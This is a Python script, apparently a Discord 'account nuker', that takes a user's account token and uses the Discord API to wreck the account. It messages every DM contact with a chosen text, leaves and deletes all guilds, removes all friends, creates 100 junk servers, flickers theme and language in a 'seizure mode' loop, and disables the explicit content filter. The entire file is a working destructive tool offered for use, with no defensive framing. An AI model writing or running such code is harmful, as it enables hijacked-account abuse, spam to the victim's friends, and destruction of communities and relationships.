import os
import sys
import time
import requests
import threading
import random
from colorama import Fore
from itertools import cycle

# Function to set the console title
def setTitle(title):
    os.system(f"title {title}")

# Function to clear the console
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Main function to nuke an account
def accnuke():
    # Function to perform the account nuke
    def nuke(usertoken, server_name, message_content):
        # Start the custom seizure mode
        if threading.active_count() <= 100:
            t = threading.Thread(target=customSeizure, args=(usertoken,))
            t.start()

        headers = {'Authorization': usertoken}

        # Send a message to all friends
        try:
            channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
            print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Sent a Message to all available friends")
            for channel in channel_ids:
                try:
                    requests.post(
                        f'https://discord.com/api/v9/channels/{channel["id"]}/messages',
                        headers=headers,
                        json={"content": message_content}
                    )
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Messaged ID: {channel['id']}")
                except Exception as e:
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error fetching channels: {e}")

        # Leave all guilds
        try:
            guild_ids = requests.get("https://discord.com/api/v7/users/@me/guilds", headers=headers).json()
            print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Left all available guilds")
            for guild in guild_ids:
                try:
                    requests.delete(f'https://discord.com/api/v7/users/@me/guilds/{guild["id"]}', headers=headers)
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Left guild: {guild['name']}")
                except Exception as e:
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error fetching guilds: {e}")

        # Delete all guilds
        try:
            print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Deleted all available guilds")
            for guild in guild_ids:
                try:
                    requests.delete(f'https://discord.com/api/v7/guilds/{guild["id"]}', headers=headers)
                    print(f'\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Deleted guild: {guild["name"]}')
                except Exception as e:
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error deleting guilds: {e}")

        # Remove all friends
        try:
            friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Removed all available friends")
            for friend in friend_ids:
                try:
                    requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', headers=headers)
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Removed friend: {friend['user']['username']}#{friend['user']['discriminator']}")
                except Exception as e:
                    print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error fetching friends: {e}")

        # Create new servers
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Created servers")
        for i in range(100):
            try:
                payload = {'name': f'{server_name}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v7/guilds', headers=headers, json=payload)
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTGREEN_EX}!{Fore.YELLOW}]{Fore.WHITE} Created {server_name} #{i}")
            except Exception as e:
                print(f"\t{Fore.YELLOW}[{Fore.LIGHTRED_EX}!{Fore.YELLOW}]{Fore.WHITE} Error: {e}")

        # Stop the seizure mode thread
        t.do_run = False

        # Change account settings
        setting = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)

        user_info = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
        user_tag = f'{user_info["username"]}#{user_info["discriminator"]}'
        print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Successfully turned {user_tag} into a hollow")

        input(f"""\n{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Press ENTER to exit""")
        main()

    # Function to switch themes and languages rapidly
    def customSeizure(usertoken):
        print(f'{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Starting seizure mode (Switching on/off Light/dark mode)')
        t = threading.currentThread()
        modes = cycle(["light", "dark"])
        while getattr(t, "do_run", True):
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

    print(f"""{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Enter account token you want to nuke""")
    usertoken = input(f"""{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Token: """)

    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Name of the servers that will be created")
    server_name = input(f'{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Name: ')

    print(f"\n{Fore.YELLOW}[{Fore.WHITE}+{Fore.YELLOW}]{Fore.WHITE} Message that will be sent to every friend: ")
    message_content = input(f'{Fore.YELLOW}[{Fore.BLUE}#{Fore.YELLOW}]{Fore.WHITE} Message: ')

    threading.Thread(target=nuke, args=(usertoken, server_name, message_content)).start()

accnuke()